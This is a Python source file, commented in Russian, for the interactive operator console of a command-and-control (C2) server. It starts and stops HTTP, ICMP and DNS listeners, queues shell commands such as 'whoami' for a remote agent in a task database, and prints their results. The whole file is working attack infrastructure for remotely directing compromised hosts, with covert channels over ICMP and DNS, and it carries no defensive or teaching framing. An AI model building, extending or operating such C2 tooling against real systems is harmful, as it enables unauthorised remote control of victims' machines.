import threading

from task_manager import TaskManager
from http_listener import run_http
from icmp_listener import run_icmp
from dns_listener import run_dns

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

running = True #flag for global rounds

listener_map = {
    'http': run_http,
    'icmp': run_icmp,
    'dns': run_dns
}

#для использования в функциях запуска слушателей
def start_listener(listeners, task_manager, type_listener):
    if type_listener in listeners and listeners[type_listener]['thread'].is_alive():
        print(f"[!] {type_listener}-слушатель уже запущен.")
        return

    stop_event = threading.Event()
    thread = threading.Thread(target=listener_map[type_listener], args=(stop_event, task_manager))
    thread.daemon = True
    thread.start()

    listeners[type_listener] = {'thread': thread, 'stop_event': stop_event}

    print(f"[+] {type_listener} запущен.")

#для использования в функциях остановки слушателей
def stop_listener(listeners, type_listener):
    if type_listener not in listeners:
        print(f"[!] {type_listener}-слушатель не запущен.")
        return

    stop_event = listeners[type_listener]['stop_event']
    stop_event.set()
    listeners[type_listener]['thread'].join(timeout=1)
    del listeners[type_listener]

    print(f"[+] {type_listener}-слушатель остановлен.")

def add_task_command(task_manager, connection, command):
    task_manager.add_task(connection, command)

def list_tasks_command(task_manager, connection, status=None):
    if status == None:
        list_tasks = task_manager.list_tasks(connection)
    else:
        list_tasks = task_manager.list_tasks(connection, status)
    
    for task in list_tasks:
        print(f"ID: {task[0]}; task: {task[1]}; status: {task[2]}")

def show_result_command(task_manager, connection, task_id):
    result = task_manager.get_task_result(connection, task_id)
    if result:
        output = result[0]
    else:
        output = "задача еще не выполнена или не найдена."
    print(f"[+] Результат команды id={task_id}: {output}")

def start_http_command(listeners, task_manager):
    start_listener(listeners, task_manager, "http")

def stop_http_command(listeners):
    stop_listener(listeners, "http")

def start_icmp_command(listeners, task_manager):
    start_listener(listeners, task_manager, "icmp")

def stop_icmp_command(listeners):
    stop_listener(listeners, "icmp")

def start_dns_command(listeners, task_manager):
    start_listener(listeners, task_manager, "dns")

def stop_dns_command(listeners):
    stop_listener(listeners, "dns")

def status_command(listeners):
    for protocol in listener_map.keys():
        if protocol in listeners and listeners[protocol]['thread'].is_alive():
            status = f"{GREEN}запущен{RESET}"
        else:
            status = "не запущен"
        print(f"{protocol + '-слушатель:':<15} {status}")

def help_command():
    commands_help = {
        "add_task <команда>": "Добавить новую задачу для выполнения агентом.",
        "list_tasks [статус]*": "Показать список задач (можно фильтровать по статусу).",
        "show_result <id>": "Показать результат выполнения задачи.",
        "start_http": "Запустить HTTP-слушатель.",
        "stop_http": "Остановить HTTP-слушатель.",
        "start_icmp": "Запустить ICMP-слушатель.",
        "stop_icmp": "Остановить ICMP-слушатель.",
        "start_dns": "Запустить DNS-слушатель.",
        "stop_dns": "Остановить DNS-слушатель.",
        "status": "Показать статус всех слушателей.",
        "help": "Показать список команд.",
        "exit": "Выйти из программы."
    }

    print("Доступные команды:\n")
    for command in commands_help:
        print(f"    {GREEN}{command:<25}{RESET}{commands_help.get(command)}")
    print("\n")
    print("    *Доступные статусы: \"pending\", \"assigned\", \"completed\", \"failed\".")
    print("\n\n")
    print("Примеры:\n")
    print("    add_task whoami")
    print("    list_tasks")
    print("    list_tasks pending")
    print("    show_result 1")

def exit_command(connection, listeners):
    connection.close()

    for key in list(listeners.keys()):
        listeners[key]['stop_event'].set()
        listeners[key]['thread'].join(timeout=1)

    global running
    running = False

    print("[+] C2 остановлен.")

def parse_and_execute(task_manager, connection, command, listeners):
    parse_command = command.split()
    
    if parse_command[0] == "add_task":
        if len(parse_command) == 1:
            print("Команда \"add_task\" требует минимум 1 аргумент.\n"
                  "Используйте так: add_task <command>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            add_task_command(task_manager, connection, ' '.join(parse_command[1:]))
            print("[+] Задача для агента успешно добавлена.")
    elif parse_command[0] == "list_tasks":
        if len(parse_command) == 1:
            list_tasks_command(task_manager, connection)
        else:
            list_tasks_command(task_manager, connection, parse_command[1])
    elif parse_command[0] == "show_result":
        if len(parse_command) != 2:
            print("Команда \"show_result\" требует один аргумент.\n"
                  "Используйте так: show_result <id>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            show_result_command(task_manager, connection, parse_command[1])
    elif parse_command[0] == "start_http":
        start_http_command(listeners, task_manager)
    elif parse_command[0] == "stop_http":
        stop_http_command(listeners)
    elif parse_command[0] == "start_icmp":
        start_icmp_command(listeners, task_manager)
    elif parse_command[0] == "stop_icmp":
        stop_icmp_command(listeners)
    elif parse_command[0] == "start_dns":
        start_dns_command(listeners, task_manager)
    elif parse_command[0] == "stop_dns":
        stop_dns_command(listeners)
    elif parse_command[0] == "status":
        status_command(listeners)
    elif parse_command[0] == "help":
        help_command()
    elif parse_command[0] == "exit":
        exit_command(connection, listeners)
    else:
        print("[-] Такой команды не существует. Для подробной информации введите \"help\".")

def main():
    listeners = {} #хеш таблица для слушателей
    tm = TaskManager("c2_tasks.db") #экземпляр БД
    con_cli = tm.get_connection()

    print("[+] C2 поднят.")

    try:
        #global rounds
        while running:
            command = input(f"{RED}C2> {RESET}")
            if not command.strip():
                continue
            parse_and_execute(tm, con_cli, command, listeners)
    except KeyboardInterrupt:
        exit_command(con_cli, listeners)

if __name__ == "__main__":
    main()
